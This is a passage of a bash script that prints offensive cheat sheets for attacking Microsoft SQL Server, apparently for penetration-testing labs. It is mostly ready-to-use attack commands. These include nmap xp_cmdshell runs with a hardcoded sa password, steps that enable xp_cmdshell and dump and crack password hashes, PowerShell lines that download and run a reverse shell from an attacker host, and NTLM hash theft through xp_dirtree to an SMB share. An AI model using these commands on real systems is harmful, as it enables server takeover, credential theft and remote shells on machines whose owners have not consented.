					echo -e "$White sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse $1 -p$2 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd=\"whoami\""
			else
					echo -e "$White sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse $1 -p1433 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd=\"whoami\""
			fi

			if [ "$2" != '' ]; then
					echo -e "$White sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse $1 -p$2 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd=powershell -c iex(new-object net.webclient).downloadstring('http://192.168.142.141/shell.ps1')"
			else
					echo -e "$White sudo nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse $1 -p1433 --script-args mssql.username=sa,mssql.password=poiuytrewq,ms-sql-xp-cmdshell.cmd=\"powershell -c iex(new-object net.webclient).downloadstring('http://192.168.142.141/shell.ps1')\""
			fi

			echo -e "$BWhite======================================================"
}

function mssql-sqsh()
{
			echo -e "$BWhite====================== mssql ========================="
			echo -e "[$BGreen MS SQL - sqsh $White]"
			
			echo -e "$BPurple Connection$White"
			echo -e "$White sqsh -S $1 -U username -P password" 
			echo -e "$Cyan >sqsh -S 10.11.1.31 -U sa -P poiuytrewq" 

			echo -e "$BPurple Find Version$White"

			echo -e "$White 1> select @@version"
			echo -e "$White 2> go"

			echo -e "$BPurple Determine current user$White"
			echo -e "$White 1> select suser_sname()"
			echo -e "$White 2> go"

			echo -e "$BPurple Find database names$White"
			echo -e "$White 1>SELECT name FROM master..sysdatabases"
			echo -e "$White 2>go"
			echo -e "$White 1>SELECT name FROM master.dbo.sysdatabases"
			echo -e "$White 2>go"

			echo -e "$BPurple Find table names$White"
			echo -e "$White 1>SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES"
			echo -e "$Cyan 1>SELECT * FROM master.INFORMATION_SCHEMA.TABLES # master database" 
			echo -e "$White 2>go"
			echo -e "$White 1>SELECT name FROM master..sysobjects WHERE xtype = 'U'"
			echo -e "$White 2>go"

			echo -e "$BPurple Find column names$White"
			echo -e "$White 1>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'table_name')"
			echo -e "$White 2>go"

			echo -e "$BPurple Extract data$White"
			echo -e "$White 1>SELECT colum_name_1 FROM table_name1"
			echo -e "$White 2>go"


			echo -e "$BPurple Determine users with sysadmin rights"
			echo -e "$White select loginname from syslogins where sysadmin = 1"

			echo -e "$BPurple Extract password hash$White"
			echo -e "$White 1>select name, password_hash from master.sys.sql_logins"
			echo -e "$White 2>go"

			echo -e "$BPurple Crack password hash$White"
			echo -e "$White john mssqlHash.txt"

			echo -e "$BPurple Command Execution"
			echo -e "$White 1>xp_cmdshell 'whoami'"
			echo -e "$White 2>go"

			echo -e "$Cyan If above does work, run the command below"

			echo -e "$White 1> EXEC SP_CONFIGURE 'show advanced options',1"
			echo -e "$White 2> reconfigure" 
			echo -e "$White 3> go"

			echo -e "$White 1> EXEC SP_CONFIGURE 'xp_cmdshell',1"
			echo -e "$White 2> reconfigure" 
			echo -e "$White 3> go"

			echo -e "$Cyan Run commands like below"
			echo -e "$White 1>xp_cmdshell 'dir C:\'"
			echo -e "$White 2>go"

			echo -e "$BPurple Reverse Shell Command Execution"
			echo -e "$White (Kali T1) cp /opt/powershell/nishang/Shells/Invoke-PowerShellTcp.ps1 ."
			echo -e "$White (Kali T1) mv Invoke-PowerShellTcp.ps1 shell.ps1"
			echo -e "$Cyan Add the following at the end of shell.ps1"
			echo -e "$White Invoke-PowerShellTcp -Reverse -IPAddress 192.168.142.141 -Port 1234"
			echo -e "$White (Kali T2) sudo python3 -m http.server 80"
			echo -e "$White (Kali T3) nc -nvlp 1234"
			echo -e "$White 1>xp_cmdshell \"powershell -c iex(new-object net.webclient).downloadstring('http://192.168.142.141/shell.ps1')\""
			echo -e "$White 2>go"

			echo -e "$White (Kali T3) cmd /c \"systeminfo\""

			echo -e "$BWhite======================================================"
}


function mssql-mssqlclient()
{
			echo -e "$BWhite====================== mssql ========================="
			echo -e "[$BGreen MS SQL - mssqlclient $White]"

			echo -e "$BPurple Connection"
			echo -e "$White mssqlclient.py username:password@$1 $Cyan # For sa or local user"
			echo -e "$White mssqlclient.py  -db volume -windows-auth DOMAIN/USERNAME:PASSWORD@$1$Cyan # Recommended when using Domain Credentials"
			echo -e "$Cyan Use the same sql commands as in sqsh"

			echo -e "$BPurple Steal NTLM hash"
			echo -e "$White sudo smbserver.py -smb2support smb ."
			echo -e "$White SQL> exec master..xp_dirtree '\\192.168.142.141\smb\'" # Steal the NTLM hash, crack it with john or hashcat
			echo -e "$white john mssqlHash.txt"

			echo -e "$BPurple Eable Command Execution"
			echo -e "$White SQL> enable_xp_cmdshell"
			echo -e "$BPurple Command Execution"
			echo -e "$White SQL> xp_cmdshell whoami /all"
			echo -e "$White SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.142.141/shell.ps1\") | powershell -noprofile'"


			echo -e "$BWhite======================================================"

}

function validate_ip()
{
	if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]
		then
  			:
		else
				 	echo -e "Invalid RHOST!!!"
			exit
		fi
}
function validate_port()
{
	if [ "$1" != '' ]
		then

		if [[ $1 -lt 65536 && $1 -gt 0 ]] 
			then
  				:
			else
				echo -e "Invalid RPORT Value !!!"
				exit
		fi
	fi
}

function validate_url()
{
	# REGREX
	url_regrex='(https?|ftp|file)://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]'

	if [[ $1 =~ $url_regrex ]]
		then
  			:
		else
				 	echo -e "Invalid URL[:PORT]Value !!!"
			exit
		fi
}


if [ $# -lt 1 ]
then
			echo -e "$BWhite====================== GimmeGimme ================================"
			echo -e "$BGreen	--int-tty$BWhite 	: Print Reverse Shell Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --int-tty"
		 	echo -e "$BGreen	--rev-shell$BWhite 	: Print Reverse Shell Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --rev-shell LHOST LPORT win/lin"
		 	echo -e "$BGreen	--file-transfer$BWhite : Print File Transfer Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --file-transfer LHOST LPORT win/lin"
		 	echo -e "$BGreen	--msf-venom$BWhite 	: Print msfvenom Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --msf-venom LHOST LPORT"
			echo -e "$BGreen	--gobuster$BWhite 	: Print gobuster Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --gobuster URL[:RPORT]"
			echo -e "$BGreen	--ftp $BWhite 		: Print ftp Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --ftp RHOST [RPORT]"
			echo -e "$BGreen	--tftp $BWhite 	: Print tftp Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --tftp RHOST [RPORT]"
			echo -e "$BGreen	--smb $BWhite 		: Print smb Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --smb //RHOST/dir [RPORT]"
			echo -e "$BGreen	--mssql-nmap $BWhite 	: Print mssql-nmap Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --mssql-nmap RHOST [RPORT]"
			echo -e "$BGreen	--mssql-sqsh $BWhite 	: Print mssql-nmap Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --mssql-sqsh RHOST [RPORT]"
			echo -e "$BGreen	--mssql-mssqlclient $BWhite : Print mssql-mssqlclient Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --mssql-mssqlclient RHOST [RPORT]"
			echo -e "$BGreen	--mysql $BWhite 	: Print mysql Cheatsheet"
		 	echo -e "			Syntax: gimme.sh --mysql RHOST [RPORT]"
		 	echo -e "$BWhite=================================================================="
	exit
fi

case $1 in
	"--int-tty")
		if [ $# -lt 1 ]
		then
				 	echo -e "Syntax: gimme.sh --int-tty"
			exit
		fi
		int-tty
	;;
	"--rev-shell")
		if [ $# -lt 4 ]
		then
				 	echo -e "Syntax: gimme.sh --rev-shell LHOST LPORT win/lin"
			exit
		fi
		validate_ip $2
		validate_port $3
		rev $2 $3 $4
	;;
	"--file-transfer")
		if [ $# -lt 4 ]
		then
				 	echo -e "Syntax: gimme.sh --file-transfer LHOST LPORT win/lin"
			exit
		fi
		validate_ip $2
		validate_port $3
		ft $2 $3 $4
	;;
	"--msf-venom")
		if [ $# -lt 3 ]
		then
				 	echo -e "Syntax: gimme.sh --msf-venom LHOST LPORT win/lin/web"
			exit
		fi
		validate_ip $2
		validate_port $3
		venom $2 $3 $4
	;;
	"--gobuster")
		if [ $# -lt 2 ]
		then
				 	echo -e "Syntax: gimme.sh --gobuster URL[:RPORT]"
			exit
		fi
		validate_url $2
		gobuster $2
	;;
	"--ftp")

		echo $#

		if [ $# -lt 2 ]
		then
				 	echo -e "Syntax: gimme.sh --ftp RHOST RPORT"
			exit
		fi

		if [ $# -gt 3 ]
		then
				 	echo -e "Syntax: gimme.sh --ftp RHOST RPORT"
			exit
		fi

		validate_ip $2
		if [ $# -eq 3 ]
		then
				validate_port $3
		fi
		ftp $2 $3
	;;
	"--tftp")
		if [ $# -lt 2 ]
		then
				 	echo -e "Syntax: gimme.sh --tftp RHOST RPORT"
			exit
		fi
		validate_ip $2
		validate_port $3
		tftp $2 $3
	;;
	"--smb")
		if [ $# -lt 2 ] 
		then
				 	echo -e "Syntax: gimme.sh --smb //RHOST/dir [RPORT]"
			exit
		fi
		smb $2 $3
	;;
	"--mssql-nmap")

		if [ $# -lt 2 ] 
		then
				 	echo -e "Syntax: gimme.sh --mssql-nmap RHOST [RPORT]"
			exit
		fi
		validate_ip $2
		if [ "$3" != '' ] 
		then
					validate_port $3 
		fi
		mssql-nmap $2 $3
	;;
	"--mssql-sqsh")

		if [ $# -lt 2 ] 
		then
				 	echo -e "Syntax: gimme.sh --mssql-sqsh RHOST [RPORT]"
			exit
		fi
		validate_ip $2
		if [ "$3" != '' ] 
		then
					validate_port $3 
		fi
		mssql-sqsh $2 $3
	;;
	"--mssql-mssqlclient")

		if [ $# -lt 2 ] 
		then
				 	echo -e "Syntax: gimme.sh --mssql-mssqlclient RHOST [RPORT]"
			exit
		fi
		validate_ip $2
		if [ "$3" != '' ] 
		then
					validate_port $3 
		fi
		mssql-mssqlclient $2 $3
	;;

	*)
			 	echo -e "$BGreen D$BPurple u$BBlue d$BYellow e$BCyan .$BGreen .$BPurple . "

esac
